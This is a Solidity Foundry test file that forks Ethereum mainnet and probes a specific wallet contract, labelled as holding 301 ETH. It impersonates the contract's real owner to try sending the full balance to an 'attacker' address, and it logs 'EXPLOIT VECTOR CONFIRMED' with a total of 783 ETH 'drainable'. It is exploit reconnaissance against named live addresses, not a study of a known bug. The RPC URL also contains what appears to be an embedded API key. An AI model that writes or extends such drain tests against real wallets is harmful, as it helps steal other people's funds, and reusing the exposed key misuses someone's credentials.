// SPDX-License-Identifier: MIT
pragma solidity ^0.8.19;

import "forge-std/Test.sol";
import "forge-std/console.sol";

contract OwnerImpersonationTest is Test {
    address constant TARGET = 0xbd6eD4969D9e52032eE3573e643f6a1bdC0a7E1E; // 301 ETH
    address constant OWNER = 0xC8668bF0A13eFa2D508642006fb4965878cA1fd9; // Actual owner

    address attacker;

    function setUp() public {
        vm.createSelectFork("https://eth-mainnet.g.alchemy.com/v2/pLXdY7rYRY10SH_UTLBGH");
        attacker = makeAddr("attacker");
    }

    function test_ownerCanDrain() public {
        console.log("=== OWNER IMPERSONATION TEST ===");
        console.log("Target balance:", TARGET.balance / 1e18, "ETH");
        console.log("Owner:", OWNER);

        // Verify owner status
        (bool s, bytes memory d) = TARGET.staticcall(abi.encodeWithSignature("isOwner(address)", OWNER));
        console.log("OWNER isOwner:", s && abi.decode(d, (bool)));

        // Get required
        (s, d) = TARGET.staticcall(abi.encodeWithSignature("m_required()"));
        console.log("Required:", abi.decode(d, (uint256)));

        // Get daily limit
        (s, d) = TARGET.staticcall(abi.encodeWithSignature("m_dailyLimit()"));
        console.log("Daily limit:", abi.decode(d, (uint256)) / 1e18, "ETH");

        // Try execute as owner
        uint256 ownerBalBefore = OWNER.balance;
        uint256 targetBalBefore = TARGET.balance;

        console.log("");
        console.log("Executing as OWNER to drain to attacker...");

        vm.prank(OWNER);
        (s,) = TARGET.call(
            abi.encodeWithSignature("execute(address,uint256,bytes)", attacker, targetBalBefore, "")
        );
        console.log("Execute success:", s);

        console.log("Target balance after:", TARGET.balance / 1e18, "ETH");
        console.log("Attacker balance:", attacker.balance / 1e18, "ETH");

        if (attacker.balance > 0) {
            console.log("");
            console.log("!!! OWNER CAN DRAIN - EXPLOIT VECTOR CONFIRMED !!!");
            console.log("!!! Total drainable: 301 + 250 + 232 = 783 ETH !!!");
        }
    }

    function test_whatBlocksExecution() public {
        console.log("=== DEBUGGING WHY EXECUTE FAILS ===");

        // Call execute and capture the return value
        uint256 amount = 1 ether;

        // As non-owner
        vm.prank(attacker);
        (bool s1, bytes memory ret1) = TARGET.call(
            abi.encodeWithSignature("execute(address,uint256,bytes)", attacker, amount, "")
        );
        console.log("Non-owner execute success:", s1);
        console.log("Return data length:", ret1.length);
        if (ret1.length > 0) {
            console.logBytes(ret1);
        }

        // As owner
        vm.prank(OWNER);
        (bool s2, bytes memory ret2) = TARGET.call(
            abi.encodeWithSignature("execute(address,uint256,bytes)", attacker, amount, "")
        );
        console.log("Owner execute success:", s2);
        console.log("Return data length:", ret2.length);
        if (ret2.length > 0) {
            console.logBytes(ret2);
        }

        console.log("Attacker balance:", attacker.balance);
    }

    function test_trySmallAmount() public {
        console.log("=== TRY SMALL AMOUNT AS OWNER ===");

        // Get spent today
        (bool s, bytes memory d) = TARGET.staticcall(abi.encodeWithSignature("m_spentToday()"));
        console.log("Spent today:", abi.decode(d, (uint256)) / 1e18, "ETH");

        // Try 0.01 ETH
        uint256 amount = 0.01 ether;
        uint256 balBefore = attacker.balance;

        vm.prank(OWNER);
        TARGET.call(abi.encodeWithSignature("execute(address,uint256,bytes)", attacker, amount, ""));

        console.log("Attacker received:", (attacker.balance - balBefore) / 1e15, "finney");
    }
}
